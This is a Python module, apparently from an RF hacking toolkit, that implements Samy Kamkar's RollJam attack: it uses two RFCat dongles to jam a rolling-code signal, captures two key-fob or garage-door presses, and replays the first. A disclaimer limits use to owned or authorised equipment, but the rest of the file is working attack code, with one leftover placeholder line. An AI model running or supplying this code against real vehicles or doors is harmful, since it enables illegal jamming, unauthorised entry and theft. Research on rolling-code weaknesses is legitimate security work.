"""Capture-jam-replay attack pattern.

ETHICS / LEGAL: This implements an active attack pattern against rolling-code
RF systems (Samy Kamkar's "RollJam"). Running it against vehicles, garage
doors, or any other system you do not own is illegal in most jurisdictions
under jamming, interception, and unauthorised-access laws. Use only on
equipment you own, in a shielded enclosure, or under written authorisation.
See RFOX.md for the full disclaimer.
"""
import time
from . import _common

HELP = "Jam, capture press 1, stop jam, capture press 2, replay press 1"


def add_args(p):
    p.add_argument("--scanner-index", type=int, default=0)
    p.add_argument("--jammer-index", type=int, default=1,
                   help="if equal to scanner-index, single-dongle mode")
    _common.add_profile_preset(p)
    _common.add_radio_args(p, sync=True, deviation=True, pktlen=True,
                           preamble=True, power=True, fixed=True)
    p.add_argument("--jam-offset", type=float, default=0.0,
                   help="Hz offset from target freq for jamming")
    p.add_argument("-o", "--output", default=None,
                   help="optional pcap path to save the captures")
    p.add_argument("--max-jam-seconds", type=float, default=30.0,
                   help="hard cap so we never jam forever")
    p.add_argument("--timeout-ms", type=int, default=1000)


def prompt(args):
    args.freq = float(input(f"target freq Hz [{args.freq or 433.92e6}]: ") or (args.freq or 433.92e6))
    args.jam_offset = float(input(f"jam offset Hz [{args.jam_offset}]: ") or args.jam_offset)


def run(args):
    if args.scanner_index == args.jammer_index:
        print("single-dongle rolljam isn't supported - need two RFCats.")
        return 2

    from .. import dongle, pcap
    cfg = _common.cfg_from_args(args)

    scanner = dongle.open_dongle(idx=args.scanner_index)
    jammer = dongle.open_dongle(idx=args.jammer_index)
    dongle.apply_config(scanner, cfg)
    jammer.setFreq(cfg.freq + args.jam_offset)
    jammer.setMdmModulation(_common.cfg_from_args(args).modulation
                             and 0 or 0)  # placeholder, applied below
    dongle.apply_config(jammer, cfg)
    jammer.setFreq(cfg.freq + args.jam_offset)

    payload_jam = b"\xff" * 240

    def capture_one(timeout_s):
        scanner.setModeRX()
        deadline = time.time() + timeout_s
        while time.time() < deadline:
            try:
                p, ts = scanner.RFrecv(args.timeout_ms)
                return p, ts
            except Exception as e:
                if "Timeout" in repr(e):
                    continue
                raise
        return None, None

    print("# rolljam: starting jam, waiting for press 1...")
    deadline = time.time() + args.max_jam_seconds
    captures = []
    try:
        while time.time() < deadline and len(captures) < 2:
            jammer.RFxmit(payload_jam)
            # opportunistically poll the scanner
            try:
                p, ts = scanner.RFrecv(50)
                if p:
                    print(f"  capture {len(captures)+1}: {len(p)}B  {p[:24].hex()}")
                    captures.append((p, ts))
            except Exception:
                pass
        if len(captures) < 1:
            print("# nothing captured.")
            return 1

        print("# stopping jam, replaying first capture...")
        jammer.setModeIDLE()
        time.sleep(0.05)
        scanner.setModeIDLE()
        scanner.RFxmit(captures[0][0])
    finally:
        try: scanner.setModeIDLE()
        except Exception: pass
        try: jammer.setModeIDLE()
        except Exception: pass

    if args.output:
        with pcap.PcapWriter(args.output) as w:
            for p, ts in captures:
                w.write(pcap.CapturedFrame(ts=time.time(), cfg=cfg, rssi=0.0,
                                            payload=p))
        print(f"# saved {len(captures)} frames -> {args.output}")
    return 0
